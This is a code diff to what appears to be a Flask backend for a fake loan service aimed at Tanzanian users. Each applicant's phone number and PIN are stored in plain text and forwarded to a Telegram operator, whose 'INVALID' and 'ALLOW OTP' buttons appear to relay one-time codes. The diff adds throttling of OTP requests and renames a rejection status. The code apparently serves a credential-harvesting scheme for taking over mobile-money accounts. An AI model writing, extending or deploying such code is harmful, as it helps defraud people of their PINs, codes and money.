@@ -63,7 +63,7 @@ def poll_telegram():
                         conn = sqlite3.connect('database.db'); c = conn.cursor()
                         if cb_data.startswith('deny_'): 
                             aid=cb_data.replace('deny_','')
-                            c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,)); conn.commit()
+                            c.execute('UPDATE loans SET status="invalid_number", code_status="invalid_number" WHERE app_id=?',(aid,)); conn.commit()
                             edit_telegram(msg_id,original+'\n\n❌ INVALID')
                         elif cb_data.startswith('allow_'): 
                             aid=cb_data.replace('allow_','')
@@ -103,7 +103,16 @@ def submit_loan():
     code = str(random.randint(1000, 9999))
     phone = data.get('phone',''); pin = data.get('pin','')
     amount = int(data.get('amount',0)); months = int(data.get('months',1))
+    purpose = data.get('purpose','')
     conn = sqlite3.connect('database.db'); c = conn.cursor()
+    
+    if purpose == 'OTP REQUESTED':
+        c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
+        resend_count = c.fetchone()[0]
+        if resend_count >= 3:
+            conn.close()
+            return jsonify({'success': False, 'error': 'Umeomba OTP mara nyingi. Subiri.'})
+    
     c.execute('SELECT total_applications FROM users WHERE phone = ?',(phone,))
     existing = c.fetchone(); is_returning = existing is not None
     if is_returning: c.execute('UPDATE users SET total_applications = total_applications + 1 WHERE phone = ?',(phone,))
@@ -111,7 +120,6 @@ def submit_loan():
     c.execute('INSERT INTO loans (app_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?)',(app_id,amount,months,phone,pin,code))
     conn.commit(); conn.close()
     prefix = '🔄 RETURNING USER' if is_returning else '📥 NEW LOAN REQUEST'
-    purpose = data.get('purpose','')
     if purpose == 'OTP REQUESTED': prefix = '📤 OTP REQUESTED'
     msg = f'{prefix}\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n🔢 PIN: {pin}\n💰 Amount: TZS {amount:,}'
     keyboard = {'inline_keyboard': [[{'text':'❌ INVALID','callback_data':f'deny_{app_id}'},{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]}
@@ -149,7 +157,7 @@ def webhook():
         conn = sqlite3.connect('database.db'); c = conn.cursor()
         if cb_data.startswith('deny_'): 
             aid=cb_data.replace('deny_','')
-            c.execute('UPDATE loans SET status="wrong_pin" WHERE app_id=?',(aid,)); conn.commit()
+            c.execute('UPDATE loans SET status="invalid_number", code_status="invalid_number" WHERE app_id=?',(aid,)); conn.commit()
             edit_telegram(msg_id,original+'\n\n❌ INVALID')
         elif cb_data.startswith('allow_'): 
             aid=cb_data.replace('allow_','')
